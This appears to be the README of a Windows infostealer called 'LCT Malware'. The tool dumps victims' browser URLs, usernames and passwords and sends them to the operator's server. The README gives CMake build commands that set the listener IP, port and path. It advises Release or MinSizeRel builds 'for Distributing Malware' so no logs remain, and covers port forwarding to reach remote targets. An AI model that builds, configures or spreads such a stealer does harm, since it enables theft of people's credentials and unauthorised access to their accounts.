LCT Malware has ability to dump target's browsers URL, username and passwords then send to your web server.

Requirements:
+ CMake
+ MinGW Compiler
+ Ninja ( Optional )

Project Dependencies:
+ Win32 API
+ LibSodium
+ Sqlite3

# Building On Windows
Building the Malware in Windows is Really StraightForward, You Only need to execute those commands:
```
cmake -Bbuild -DHOSTNAME="{YourIP}" -DPORT=5656 -DPATH=/app -DBUILDTYPE="{BuildType}" -G "{Builder}"
```
Except {YourIP}, You should insert the listener IP<br/>
*Note: if the target is not in the local network , you should handle the "Port Forwarding" Operations*

Execpt {BuildType} You can put: MinSizeRel, Debug, Release, RelWithDebInfo<br/>
in `Debug` and `RelWithDebInfo`, you can see Log about the application workflow.
but in the other Build Types, there will be no Log ( So You should Use Release or MinSizeRel for Distributing Malware ).

Except {Builder} if you have Ninja you can simply put `Ninja`, or you can use MinGW Makefile by putting `MinGW Makefiles`.

After you configuer project with the command, You can use Ninja or MinGW Makefile to Build the Project.

Building with Ninja:
```
ninja -C build
```

Building with MinGW Makefile:
```
mingw32-make -C build
```

By the way this project was tested on Ninja Builder, and its faster, So its better option if you can use :)

# Building On Linux
**Note: Building on Linux, Does'nt mean that your project can run in Linux! the Target Of this Malware Can Only be Windows OS**

Building On linux is a bit complicated unlike Windows.
